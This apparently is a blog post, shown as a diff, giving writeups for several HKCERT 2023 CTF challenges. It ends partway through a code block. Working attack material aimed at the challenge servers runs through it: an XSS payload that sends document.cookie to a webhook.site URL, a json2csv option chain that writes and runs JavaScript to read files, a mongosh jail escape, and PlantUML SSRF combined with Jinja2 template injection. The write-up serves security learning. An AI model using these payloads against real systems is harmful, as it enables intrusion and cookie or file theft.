@@ -1,0 +1,988 @@
+---
+pubDatetime: 2023-11-15T20:20:00Z
+title: HKCERT 2023 CTF Writeup
+postSlug: hkcert23
+featured: true
+draft: false
+tags:
+  - ctf
+  - hkcert
+description: Writeup of 8 different challenges from the HKCERT 2023 CTF.
+---
+
+I participated in the [HKCERT 2023 CTF](https://ctf.hkcert.org/) from November 10th to 12th. Our team (O0089 - EzAntiPwn) of 3 placed #8 in the open division, and #15 out of all teams (including international teams).
+![our team result](https://i.sportshead.dev/u78xrjn.png)
+
+## Table of contents
+
+## Re:Zero - #web
+
+_150 points, 210 solves_
+
+> 1. Complete Achievement 0 - 20
+> 2. No Revives, No Kill, Dealt 0 damage in game
+>
+> Once completed, refresh the browser and the flag will be printed on the console.
+>
+> Web: http://chal.hkcert23.pwnable.hk:28040
+>
+> Note: There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-i-en-a58d115f39feab46).
+
+We're given [a blog post](https://hackmd.io/@blackb6a/hkcert-ctf-2023-i-en-a58d115f39feab46) in the challenge description that kind of gives the entire challenge away:
+![screenshot of the blog post](https://i.sportshead.dev/ksje04o.png)
+
+Checking the storage tab in firefox shows us that there is indeed data in `localStorage`:
+![firefox devtools storage showing data object](https://i.sportshead.dev/vxvfnw6.png)
+
+Now we can just run some code in the console to edit the `data.achievements.unlocked` array:
+
+```javascript
+let d = JSON.parse(localStorage.data);
+d.achievements.unlocked = [
+  0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+];
+localStorage.data = JSON.stringify(d);
+JSON.parse(localStorage.data).achievements; // check it worked
+```
+
+![firefox console showing code above being run](https://i.sportshead.dev/w3ag3nu.png)
+
+And now if we reload the page...
+
+![firefox console showing flag](https://i.sportshead.dev/4vf0wunh.png)
+Flag: `hkcert23{m0dm0d__loc4l__stor4g3}`
+
+![screenshot of discord showing first blood 5 minutes after ctf started](https://i.sportshead.dev/15ja6kwf.png)
+Got a first blood within 5 minutes as well!
+
+## ST Code (I) - #misc
+
+_50 points, 198 solves_
+
+> Flag 1: Can you read the flag from ST Code?
+> Web: http://stcode-3983gi.hkcert23.pwnable.hk:28211 > **Note**: There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#ST%E7%A2%BC-I--ST-Code-I-Misc).
+
+:::success
+Code used in this solution (and for ST Code II) can be found [on GitHub](https://github.com/sportshead/hkcert23-stcode).
+:::
+
+<div class="font-regular bg-blue-500 text-white relative mb-4 block w-full rounded-lg p-4 text-base leading-5 opacity-100">
+  <svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512">
+    {/*Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc.*/}
+    <path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z" />
+  </svg>
+  Alert with Icon
+</div>
+
+The guide gives us a big hint:
+![guide blog post](https://i.sportshead.dev/dm96r8c.png)
+We can see in the svg file that the QR code is made up of a lot of `rect` elements that have `rx` attributes:
+![screenshot of the flag svg file](https://i.sportshead.dev/z1lmmc8.png)
+Using this information, let's write a Typescript file [`stcode.ts`](https://github.com/sportshead/hkcert23-stcode/blob/master/stcode.ts) to parse STCode.
+
+```typescript=
+import { XMLParser } from "fast-xml-parser";
+
+const xmlOptions = {
+    ignoreAttributes: false,
+    unpairedTags: ["rect"],
+    ignoreDeclaration: true,
+};
+const parser = new XMLParser(xmlOptions);
+
+interface SVGXml {
+    svg: {
+        rect: {
+            "@_rx"?: string;
+        }[];
+    };
+}
+
+export function decodeST(svg: string | Buffer): string {
+    const xml: SVGXml = parser.parse(svg);
+
+    let bits: boolean[] = [];
+    for (const rect of xml.svg.rect) {
+        if ("@_rx" in rect) {
+            bits.push(rect["@_rx"] === "1");
+        }
+    }
+    return bitsToAscii(bits);
+}
+
+export function bitsToAscii(bits: boolean[]): string {
+    return bits
+        .reduce((acc, cur) => acc + (cur ? "1" : "0"), "")
+        .match(/\d{8}/g)!
+        .reduce((acc, cur) => acc + String.fromCharCode(parseInt(cur, 2)), "");
+}
+```
+
+Now we can make a script [`flag1.ts`](https://github.com/sportshead/hkcert23-stcode/blob/master/flag1.ts) to decode the ST from the file:
+
+```typescript=
+import { decodeST } from "./stcode.ts";
+import { readFileSync } from "fs";
+
+const flag1 = decodeST(readFileSync("./flag1.svg"));
+console.log(flag1);
+```
+
+And running the script with [`bun`](https://bun.sh) gets us the flag:
+
+```bash
+$ bun run flag1.ts
+hkcert23{ST_ST&s4_STegan0graphy--STeg0}
+```
+
+## ST Code (II) - #misc
+
+_350 points, 32 solves_
+
+> Flag 2: Can you generate ST Code to read the flag?
+> Web: http://stcode-3983gi.hkcert23.pwnable.hk:28211
+
+:::success
+Code used in this solution (and for ST Code I) can be found [on GitHub](https://github.com/sportshead/hkcert23-stcode).
+:::
+
+Navigating to [`/flag2`](http://stcode-3983gi.hkcert23.pwnable.hk:28211/flag2) presents us with the challenge:
+![image](https://i.sportshead.dev/ks4skiu.png)
+We can see that we get a session id cookie and a timer. Let's check [`/source`](http://stcode-3983gi.hkcert23.pwnable.hk:28211/source) for the source code (full source [here](https://github.com/sportshead/hkcert2023-stcode/blob/master/source.js)).
+
+```javascript=
+app.post('/flag2', upload.single('svg'), async (req, res) => {
+  var svg = null;
+  try{
+    if(req.file && req.file.fieldname == 'svg'){
+      svg = fs.readFileSync(req.file.path);
+      fs.unlinkSync(req.file.path);
+    }
+  }catch(e){}
+  res.setHeader('content-type', 'text/plain');
+  if(req.session.start){
+    var left = (60-(Date.now()-req.session.start)/1000);
+    if(left < 0){
+      req.session.destroy();
+      res.send(`Time's up...`);
+    }else{
+      if(req.session.done == 0){
+        try{
+          var qr = await decodeQR(svg);
+          if(qr == flag1){
+            req.session.done += 1;
+            res.send(`Complete 15 more times to get flag.\nQRCode:\n`+req.session.qrcode+`\nSTCode:\n`+req.session.stcode+`\nYour have `+left+` seconds left.`);
+          }else{
+            res.send('Wrong flag1');
+          }
+        }catch(e){
+          res.send('Error');
+        }
+      }else{
+        try{
+          var qr = await decodeQR(svg);
+          if(qr != req.session.qrcode){
+            res.send('Wrong QR');
+          }else{
+            var st = decodeST(svg);
+            if(st != req.session.stcode){
+              res.send('Wrong ST');
+            }else{
+              req.session.done += 1;
+              if(req.session.done > 15){
+                req.session.destroy();
+                res.send(`Congratulations! You have completed this stage!\n`+flag2);
+              }else{
+                req.session.qrcode = random_string(16-req.session.done);
+                req.session.stcode = random_string(req.session.done);
+                res.send(`Complete `+(16-req.session.done)+` more times to get flag.\nQRCode:\n`+req.session.qrcode+`\nSTCode:\n`+req.session.stcode+`\nYour have `+left+` seconds left.`);
+              }
+            }
+          }
+        }catch(e){
+          res.send('Error');
+        }
+      }
+    }
+  }else{
+    res.send(`Time's up...`);
+  }
+});
+```
+
+It seems like we will need to produce 15 correct QR codes with ST codes embedded to get the flag. We can use the same XML library to reverse the operation and add `rx` attributes to the `rect`s:
+
+```typescript=
+export function encodeST(svg: string | Buffer, secret: string): string {
+    const xml: SVGXml = parser.parse(svg);
+    const bits = asciiToBits(secret);
+    console.log(xml.svg.rect.length, bits.length);
+
+    for (let i = 0; i < bits.length; i++) {
+        // skip first rect
+        xml.svg.rect[i + 1]["@_rx"] = bits[i] ? "1" : "0";
+    }
+
+    return `<?xml version="1.0" standalone="yes"?>
+${builder.build(xml).replaceAll(/(<rect.+?)>/g, "$1/>")}`;
+}
+```
+
+And then a script [`flag2.ts`](https://github.com/sportshead/hkcert23-stcode/blob/master/flag2.ts) to interact with the challenge site:
+
+```typescript=
+import { readFile, writeFile } from "fs/promises";
+import { encodeQR, encodeST } from "./stcode.ts";
+
+const HOST = "http://stcode-3983gi.hkcert23.pwnable.hk:28211";
+const flag1 = await readFile("./flag1-qr.svg", "utf8");
+
+const res = await fetch(`${HOST}/flag2`, { redirect: "manual" });
+const cookie = res.headers.get("Set-Cookie")!.split(";")[0];
+console.log("got cookie", cookie);
+
+const uploadSvg = (svg: string): Promise<string> => {
+    const data = new FormData();
+    data.append(
+        "svg",
+        new File([svg], "getpwned.svg", { type: "image/svg+xml" }),
+    );
+    return fetch(`${HOST}/flag2`, {
+        method: "POST",
+        headers: {
+            Cookie: cookie,
+        },
+        body: data,
+    }).then((res) => res.text());
+};
+
+const regex = /QRCode:\n(.+)\nSTCode:\n(.+)\n/;
+let svg = flag1;
+while (true) {
+    const output = await uploadSvg(svg);
+    console.log(output);
+
+    const match = output.match(regex);
+    if (!match) {
+        throw match;
+    }
+
+    const [_, qr, st] = match;
+
+    console.log(`qr: '${qr}'\nst: '${st}'`);
+    svg = encodeST(encodeQR(qr), st);
+    await writeFile("./flag2.debug.svg", svg);
+}
+```
+
+However, running the script throws an error!
+
+```js!
+$ bun run flag2.ts
+got cookie connect.sid=s%3AxsaE5rs6vwmFKg-X_cBASerpVn9vdv3H.Rp9hULLKRzUTyNNGetTKfKB0n2FAZ02CtHPv9Ri%2BrEQ
+Complete 15 more times to get flag.
+QRCode:
+6l81f8pnzqkxzsd6cj0p4a9pwjqaf2anmryscs1q7aefxdt1qztx6auz7nbl
+STCode:
+kbg9
+Your have 59.303 seconds left.
+...
+Complete 5 more times to get flag.
+QRCode:
+cz3ehqmky449aublof7a
+STCode:
+k5sg23o54ngnt1jey3e9alumhlh53cerwu4chgcdmzzg
+Your have 53.185 seconds left.
+qr: 'cz3ehqmky449aublof7a'
+st: 'k5sg23o54ngnt1jey3e9alumhlh53cerwu4chgcdmzzg'
+327 352
+42 |     const bits = asciiToBits(secret);
+43 |     console.log(xml.svg.rect.length, bits.length);
+44 |
+45 |     for (let i = 0; i < bits.length; i++) {
+46 |         // skip first rect
+47 |         xml.svg.rect[i + 1]["@_rx"] = bits[i] ? "1" : "0";
+            ^
+TypeError: undefined is not an object (evaluating 'xml.svg.rect[i + 1]["@_rx"] = bits[i] ? "1" : "0"')
+      at encodeST (/Users/user/projects/ctf/hkcert/2023/stcode/stcode.ts:47:8)
+      at /Users/user/projects/ctf/hkcert/2023/stcode/flag2.ts:40:10
+```
+
+Looking at our debug output shows us the problem: `bits.length`, the length of the ST Code bit array, is greater than `xml.svg.rect.length`, the amount of `rect` elements in the QR code svg. This is because the QR codes that the challenge needs gets smaller and smaller while the ST codes get larger and larger. We can solve this problem by duplicating the `rect`s in the svg for more `rx` space:
+
+```diff=39
+ export function encodeST(svg: string | Buffer, secret: string): string {
+     const xml: SVGXml = parser.parse(svg);
++    //duplicate qr squares for more st space
++    xml.svg.rect.push(...xml.svg.rect.slice(1).map((obj) => ({ ...obj })));
++
++    //duplicate qr squares for more st space (again)
++    xml.svg.rect.push(...xml.svg.rect.slice(1).map((obj) => ({ ...obj })));
+     const bits = asciiToBits(secret);
+```
+
+Now with plenty of space to fit the ST Code, we can run the script again to get the flag.
+
+```javascript
+$ bun run flag2.ts
+got cookie connect.sid=s%3AtKU06E4qhCoowoLxU-Ulu0I01QqX_ZDn.oBsZiLVwe%2BPXJ5jMecklXW4aHJomte9oBaMXPIAYY%2B0
+...
+Complete 1 more times to get flag.
+QRCode:
+8lmp
+STCode:
+qyzq9kt4wb6l4ndpztrw4huqdiohbaqpoczosty5l8imltgp6eot612t3o4m
+Your have 53.189 seconds left.
+qr: '8lmp'
+st: 'qyzq9kt4wb6l4ndpztrw4huqdiohbaqpoczosty5l8imltgp6eot612t3o4m'
+905 480
+Congratulations! You have completed this stage!
+hkcert23{ST_ST&s4_Speeeeeeed_&_Tricks--cksckscks}
+error: null
+```
+
+Flag: `hkcert23{ST_ST&s4_Speeeeeeed_&_Tricks--cksckscks}`
+
+## Baby XSS again - #web
+
+_100 points, 132 solves_
+
+> Someone complained that XSS challenges are hard. We hear your opinion.
+> You can inject any external javascript from `https://pastebin.com` as you like using the `src` parameter in the query string. Good luck!
+> Web: http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232?src=https://pastebin.com/xNRmEBhV
+> Attachment: [babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip](https://file.hkcert23.pwnable.hk/babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip) > **Note**: There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E5%8F%88%E6%9C%89%E5%AF%B6%E8%B2%9D-XSS--Baby-XSS-again-Web).
+
+Once again, the guide tells us what to do:
+![screenshot of blog post](https://i.sportshead.dev/bwmbipv.png)
+We just need to create a simple [pastebin](https://pastebin.com/q7Ae2DjF) with a [webhook.site](https://webhook.site/) payload:
+
+```javascript
+location = "https://webhook.site/ff14958b-f196-45fb-bfe3-b3ad0a1cd7d8/?cookie=" + document.cookie;
+```
+
+Now we use the download link as suggested by the blog post to submit our XSS:
+![challenge page with xss link](https://i.sportshead.dev/3m0ukz5.png)
+Submitting the URL gets us our flag in webhook.site.
+
+![screenshot of webhook.site dashboard showing flag](https://i.sportshead.dev/ar0xzrl.png)
+
+Flag: `hkcert23{pastebin_0r_trashbin}`
+
+## json2csv - #pwn
+
+_350 points, 8 solves_
+
+> WebService: http://chal-a.hkcert23.pwnable.hk:28320 , http://chal-b.hkcert23.pwnable.hk:28320
+> Attachment: [json2csv_7f0a166574d46a7752db8d81b337f612.zip](https://file.hkcert23.pwnable.hk/json2csv_7f0a166574d46a7752db8d81b337f612.zip)
+
+Now we're getting into the harder challenges. Navigating to the webservice shows us a simple UI with an input field, and command line options field.
+![challenge web service](https://i.sportshead.dev/3hpqahtg.png)
+Naturally with any web service to CLI program challenge, let's first try a simple shell injection payload in the command line options.
+![shell injection](https://i.sportshead.dev/oa52lfq.png)
+Executing this query only gets us the CSV of our input:
+![image](https://i.sportshead.dev/3sjewn3g.png)
+
+Let's take a look at the source code to see what's going on behind the scenes.
+
+```dockerfile=
+FROM node:18-slim
+WORKDIR /usr/src/app
+RUN npm install express body-parser
+RUN npm install -g @json2csv/cli
+COPY server.js .
+COPY proof.sh /
+RUN chmod -R 555 /usr/src/app/*
+RUN chmod 555 /proof.sh
+
+USER node
+EXPOSE 8080
+CMD ["node","server.js"]
+```
+
+The Dockerfile isn't anything special and installs the [`@json2csv/cli`](https://www.npmjs.com/package/@json2csv/cli) npm package and runs a `server.js` file.
+
+```javascript=
+const express = require('express');
+const bodyParser = require('body-parser');
+const {spawnSync} = require('child_process');
+const PORT = 8080;
+const HOST = '0.0.0.0';
+
+const app = express();
+app.use(bodyParser.urlencoded({extended: false}));
+
+app.get('/', (req, res) => {
+  res.send(`
+    <html>
+    ...
+    </html>
+  `);
+});
+
+app.post('/', (req, res) => {
+  res.setHeader('content-type', 'text/plain');
+  try{
+    const args = req.body.cmd.split(' ');
+    const csv = spawnSync('json2csv', args, {input: req.body.json});
+    res.send(csv.stdout.toString());
+  }catch(e){
+    res.send('');
+  }
+});
+
+app.listen(PORT, HOST, () => {
+  console.log(`Running on http://${HOST}:${PORT}`);
+});
+```
+
+The most interesting call is to [`child_process.spawnSync`](https://nodejs.org/api/child_process.html#child_processspawnsynccommand-args-options) on line 22. The nodejs documentation tells us the following:
+
+> The `child_process.spawnSync()` method is generally identical to `child_process.spawn()` ...
+> **If the `shell` option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.**
+
+Unfortunately for us, the `shell` option is `false` by default, meaning we'll need to find an attack vector through the `json2csv` command. Let's check the documentation on `npmjs.com`:
+
+> Fast and highly configurable JSON to CSV converter. It fully support conversion following the RFC4180 specification as well as other similar text delimited formats as TSV.
+> `@json2csv/cli` makes `json2csv` usable as a command line tool.
+
+We can also see from the command line options that we can write to arbritrary files (this will be useful later):
+
+```
+  -o, --output <output>    Path and name of the resulting csv file. Defaults to stdout.
+```
+
+Other than that, the documentation doesn't really give us much help. Let's take a look at [`src/json2csv.ts`](https://github.com/juanjoDiaz/json2csv/blob/cc4e0a3551868bd86c1b3bb02a94ed86fe983cc4/packages/cli/src/json2csv.ts). Scrolling past the [90 lines of CLI options](https://github.com/juanjoDiaz/json2csv/blob/cc4e0a3551868bd86c1b3bb02a94ed86fe983cc4/packages/cli/src/json2csv.ts#L55-L144) gets us to the [`getInputJSON` function](https://github.com/juanjoDiaz/json2csv/blob/cc4e0a3551868bd86c1b3bb02a94ed86fe983cc4/packages/cli/src/json2csv.ts#L166-L173):
+
+```typescript=
+async function getInputJSON<TRaw>(inputPath: string): Promise<TRaw> {
+  const assert =
+    extname(inputPath).toLowerCase() === '.json'
+      ? { assert: { type: 'json' } }
+      : undefined;
+  const { default: json } = await import(`file://${inputPath}`, assert);
+  return json;
+}
+```
+
+For those familiar with nodejs and ES modules in general, one thing should immediately jump out - the `await import()` call. The [`import()` function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import), "commonly called dynamic import, is a function-like expression that allows loading an ECMAScript module asynchronously and dynamically into a potentially non-module environment." What this is saying is that `import()` loads a file as an ECMAScript module (or JS module) and runs the code inside, meaning we can execute arbitrary files as JS through the input file parameter.
+
+With the `-q` parameter of `json2csv`, we can disable the quotes around the output csv:
+
+```bash
+## {"foo": "bar"}, default options
+"foo"
+"bar"
+
+## {"foo": "bar"}, empty -q param
+foo
+bar
+```
+
+Combining this with the `-o` param we found earlier, we can now write to arbitrary files and run them as JS code. Let's use a simple payload:
+![challenge page with payload](https://i.sportshead.dev/cc2aktu.png)
+
+```json!
+[{"a": "import {readFileSync} from 'fs';"}, {"a": "console.log(readFileSync('/proof.sh'))"}]
+```
+
+`-H -q  -o /tmp/sportshead.mjs`
+Note the two spaces between `-q` and `-o` - the web service splits our arguments by spaces, so we can effectively pass an empty string as the `-q` argument, disabling quotes.
+
+But running `-i /tmp/sportshead.mjs` gets us an empty output - we did something wrong here. Let's try to test this locally:
+
+```bash
+node@cf00c551f557:/usr/src/app$ json2csv -i /tmp/sportshead.js
+Error: Data should be a valid JSON object or array
+    at tokenizer.onError (file:///usr/local/lib/node_modules/@json2csv/cli/node_modules/@json2csv/plainjs/dist/mjs/StreamParser.js:76:15)
+    at Tokenizer.error (file:///usr/local/lib/node_modules/@json2csv/cli/node_modules/@streamparser/json/dist/mjs/tokenizer.js:566:14)
+    at Tokenizer.write (file:///usr/local/lib/node_modules/@json2csv/cli/node_modules/@streamparser/json/dist/mjs/tokenizer.js:548:18)
+    at JSON2CSVStreamParser.write (file:///usr/local/lib/node_modules/@json2csv/cli/node_modules/@json2csv/plainjs/dist/mjs/StreamParser.js:86:24)
+    at JSON2CSVNodeTransform._transform (file:///usr/local/lib/node_modules/@json2csv/cli/node_modules/@json2csv/node/dist/mjs/Transform.js:28:31)
+    at Transform._write (node:internal/streams/transform:175:8)
+    at writeOrBuffer (node:internal/streams/writable:392:12)
+    at _write (node:internal/streams/writable:333:10)
+    at Writable.write (node:internal/streams/writable:337:10)
+    at ReadStream.ondata (node:internal/streams/readable:777:22)
+```
+
+Wait, what? Streams? Why isn't our file being imported? Going back to the `json2csv`'s main function tells us that processing in-memory using the `getInputJSON` function is only enabled when `config.streaming` is false ([line 322](https://github.com/juanjoDiaz/json2csv/blob/cc4e0a3551868bd86c1b3bb02a94ed86fe983cc4/packages/cli/src/json2csv.ts#L322)). Adding the `-s` parameter lets us disable the streaming behaviour and import the file as JS.
+
+```
+  -s, --no-streaming    Process the whole JSON array in memory instead of doing it line by line.
+```
+
+![image](https://i.sportshead.dev/8pvops3h.png)
+
+```javascript
+<Buffer 23 21 2f 62 69 6e 2f 73 68 0a 65 63 68 6f 20 68 6b 63 65 72 74 32 33 7b 59 5f 6e 6f 74 5f 6a 75 24 74 75 73 65 5f 7a 61 2d 2d 4e 30 44 45 5f 70 61 63 ... 63 more bytes>
+```
+
+Whoops... we forgot to read the file as utf8, rookie mistake! Let's try again:
+![json2csv-03](https://i.sportshead.dev/hc90mp9.png)
+
+```bash=
+#!/bin/sh
+echo hkcert23{Y_not_ju$tuse_za--N0DE_package?!}
+## you cannot even run this script properly, what a joke
+```
+
+With only 8 solves, I personally think this challenge should have been given a bit more credit and should have deserved 400 points.
+
+## MongoJail - #pwn
+
+_250 points, 49 solves_
+
+> Can you escape from Shibuya?
+> `nc chal.hkcert23.pwnable.hk 28225`
+> Attachment: [mongojail_29b79657d01916b2653c9388d76a53b9.zip](https://file.hkcert23.pwnable.hk/mongojail_29b79657d01916b2653c9388d76a53b9.zip) > **Note**: There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E7%8D%84%E9%96%80%E7%96%86--MongoJail-Pwn).
+
+First let's try connecting to the challenge server.
+
+```bash
+user@computer:~/projects/ctf/hkcert/2023/mongojail$ nc chal.hkcert23.pwnable.hk 28225
+Enter math expression:
+1+1
+2
+```
+
+Seems like we're in some sort of REPL. Checking the blog post tells us we are in `mongosh`:
+![image](https://i.sportshead.dev/xr4n3mp.png)
+
+The blog post also mentions:
+
+> All built-in variables and functions, and `require`, `module`, `globalThis` are also ~~sealed~~ became undefined
+
+`globalThis` is blocked, but what if I do `this` globally?
+
+```javascript
+user@computer:~/projects/ctf/hkcert/2023/mongojail$ nc chal.hkcert23.pwnable.hk 28225
+Enter math expression:
+this
+{
+  global: <ref *1> {
+    global: [Circular *1],
+    clearImmediate: [Function: clearImmediate],
+    setImmediate: [Function: setImmediate] {
+      [Symbol(nodejs.util.promisify.custom)]: [Getter]
+    },
+    clearInterval: [Function: clearInterval],
+    clearTimeout: [Function: clearTimeout],
+    setInterval: [Function: setInterval],
+    setTimeout: [Function: setTimeout] {
+      [Symbol(nodejs.util.promisify.custom)]: [Getter]
+    },
+    queueMicrotask: [Function: queueMicrotask],
+    structuredClone: [Function: structuredClone],
+    atob: [Getter/Setter],
+    btoa: [Getter/Setter],
+    performance: [Getter/Setter],
+    fetch: [AsyncFunction: fetch],
+    _: [Getter/Setter],
+    '@@@mdb.signatures@@@': {
+      Document: { type: 'Document', attributes: {} },
+      CommandResult: {
+        type: 'CommandResult',
+...
+^C
+```
+
+My terminal almost exploded... guess that works! Let's see what we can do with `this` (pun intended):
+
+```javascript
+user@computer:~/projects/ctf/hkcert/2023/mongojail$ nc chal.hkcert23.pwnable.hk 28225
+Enter math expression:
+this.fs
+{
+  appendFile: [Function: appendFile],
+  appendFileSync: [Function: appendFileSync],
+  access: [Function: access],
+  accessSync: [Function (anonymous)],
+  chown: [Function: chown],
+  chownSync: [Function: chownSync],
+  chmod: [Function: chmod],
+  chmodSync: [Function: chmodSync],
+  close: [Function: close],
+  closeSync: [Function: closeSync],
+  copyFile: [Function: copyFile],
+  copyFileSync: [Function: copyFileSync],
+  cp: [Function: cp],
+  cpSync: [Function: cpSync],
+  createReadStream: [Function: createReadStream],
+  createWriteStream: [Function: createWriteStream],
+  exists: [Function: exists],
+...
+}
+```
+
+By some stroke of luck we have `this.fs` available to us.
+
+```javascript
+$ nc chal.hkcert23.pwnable.hk 28225
+Enter math expression:
+this.fs.readdirSync('/')
+[
+  'bin',
+  'boot',
+  'data',
+  'dev',
+  'docker-entrypoint-initdb.d',
+  'etc',
+  'home',
+  'js-yaml.js',
+  'lib',
+  'lib32',
+  'lib64',
+  'libx32',
+  'media',
+  'mnt',
+  'opt',
+  'proc',
+  'proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh',
+  'root',
+  'run',
+  'sbin',
+  'srv',
+  'sys',
+  'tmp',
+  'usr',
+  'var'
+]
+user@computer:~/projects/ctf/hkcert/2023/mongojail$ nc chal.hkcert23.pwnable.hk 28225
+Enter math expression:
+this.fs.readFileSync('/proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh')
+<Buffer 23 21 2f 62 69 6e 2f 73 68 0a 65 63 68 6f 20 68 6b 63 65 72 74 32 33 7b 57 6f 6c 66 72 61 6d 41 6c 70 68 61 5f 4c 30 76 33 7a 5f 53 68 69 62 75 79 61 ... 20 more bytes>
+```
+
+Once again, I forgot to set the encoding:
+
+```javascript
+user@computer:~/projects/ctf/hkcert/2023/mongojail$ nc chal.hkcert23.pwnable.hk 28225
+Enter math expression:
+this.fs.readFileSync('/proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh', {encoding:"utf8"})
+#!/bin/sh
+echo hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}
+```
+
+## ProbablyUnknown's Markup Language - #web
+
+_350 points, 11 solves_
+
+> We all know that CS majors must know a long list of markup languages like HTML, XML, etc...
+> How about IS majors? UML? Is UML even a markup language?
+>
+> [Test your UML knowledge!](http://chal.hkcert23.pwnable.hk:28104/)
+>
+> Attachment: [puml_6426aed6f38a4f0c311f8ecddfecdfa5.zip](https://file.hkcert23.pwnable.hk/puml_6426aed6f38a4f0c311f8ecddfecdfa5.zip)
+
+Navigating to the challenge site shows us an SPA "PlantUML Server":
+![challenge page](https://i.sportshead.dev/str2n8u.png)
+
+The attached zip file's `docker-compose.yml` shows us two services, `plantuml` and `puml.local`:
+
+```yaml=
+version: '3'
+
+services:
+  plantuml:
+    build: plantuml-server
+    ports:
+      - 8001:8080
+    restart: unless-stopped
+  puml.local:
+    build: web
+    restart: unless-stopped
+```
+
+`plantuml-server/Dockerfile` is only one line, and seems to be the SPA that we get from the challenge:
+
+```dockerfile=
+FROM plantuml/plantuml-server:jetty
+```
+
+On the other hand, `web/Dockerfile` is a bit more complicated, and we can see that the flag is it's usual spot of `/proof.sh`:
+
+```dockerfile=
+FROM python:alpine
+RUN apk add tini
+RUN pip install flask
+
+COPY server.py proof.sh /
+RUN chmod 555 /server.py /proof.sh
+
+ENTRYPOINT ["/sbin/tini", "--"]
+CMD ["python","server.py"]
+```
+
+`server.py` is a very simple Flask app with only a `/` route:
+
+```python=
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+@app.route("/")
+def index():
+	return render_template_string("""{%% raw %%}
+<!doctype html>
+<html>
+<head>
+    <title>PUML Demo</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    ...
+    </style>
+</head>
+
+<body>
+<div>
+    <h1>PUML Demo</h1>
+    <p><textarea>%(puml)s</textarea></p>
+    <p><a href="https://plantuml.com/">More information...</a></p>
+</div>
+</body>
+</html>
+{%% endraw %%}""" % {"puml":request.args.get("puml")})
+
+if __name__ == "__main__":
+	app.run(host="0.0.0.0", port=80)
+```
+
+Something we can see from the source code is that `render_template_string` is being called on a Python format string - meaning that we can perform [server-side template injection (SSTI)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). Unfortunately for us, the `puml.local` webservice is not exposed by `docker-compose`, meaning we will need to obtain server side request forgery (SSRF) from the PlantUML server.
+
+Let's go back to the PlantUML server and see what we can do with it. Clearing the code editor gives us this result:
+![PlantUML welcome image](https://i.sportshead.dev/50fv9je.png)
+
+Typing `license` in the editor renders the license information to the screen:
+![PlantUML license](https://i.sportshead.dev/ue6gu3wi.png)
+
+It seems like PlantUML does not only support diagrams, but also has keywords/commands like `license`. We can check the [PlantUML docs](https://plantuml.com/) for some more information.
+
+![PlantUML docs sidebar](https://i.sportshead.dev/lkqtucb.png)
+
+Immediately when we open the documentation website we can see a link to ["Preprocessing"](https://plantuml.com/preprocessing) in the sidebar.
+![preprocessing page](https://i.sportshead.dev/brt9ssxg.png)
+
+Scrolling past the generic templating language variable declarations and control flow statements gets us to a section titled "Including files or URL [!include, !include_many, !include_once]":
+![screenshot of "including files" section](https://i.sportshead.dev/aczgr1z.png)
+
+In a table named "Builtin functions", we also find a `%load_json` function:
+![load_json row](https://i.sportshead.dev/3rixzuy.png)
+
+Let's try loading `puml.local` as JSON:
+![json parse error from puml](https://i.sportshead.dev/acpdsqr.png)
+
+As expected, the JSON parser gets an error when it encounters the HTML source, but we unfortunately don't get the HTML in our output.
+
+We can use the `!include` directive instead to load the URL:
+
+```puml=
+@startuml
+!include http://puml.local
+Alice -> Bob : %load_json("http://puml.local")
+@enduml
+```
+
+![puml error log with HTML source dumped](https://i.sportshead.dev/ypdtvzr.png)
+
+Our `%load_json` parser error managed to dump the HTML source! Now that we have SSRF using the `!include` directive and dumping the HTML using the JSON parser error, we can get to some template injection. Here's a simple payload we can test out:
+
+```puml=
+@startuml
+// {% endraw %}{{1+1}}{% raw %}
+!include http://puml.local/?puml=%7B%25%20endraw%20%25%7D%7B%7B1%2B1%7D%7D%7B%25%20raw%20%25%7D%0A
+Alice -> Bob : %load_json("http://puml.local/")
+@enduml
+```
+
+![puml output with injected payload](https://i.sportshead.dev/3zasn1k.png)
+Success! Now we need to find a payload to read from `/proof.sh`. Testing out different payloads I found online got me this payload (from [swisskeyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---read-remote-file), url encoding [with cyberchef](<https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=eyUgZW5kcmF3ICV9e3tnZXRfZmxhc2hlZF9tZXNzYWdlcy5fX2dsb2JhbHNfXy5fX2J1aWx0aW5zX18ub3BlbigiL3Byb29mLnNoIikucmVhZCgpfX17JSByYXcgJX0>)):
+
+```puml=
+@startuml
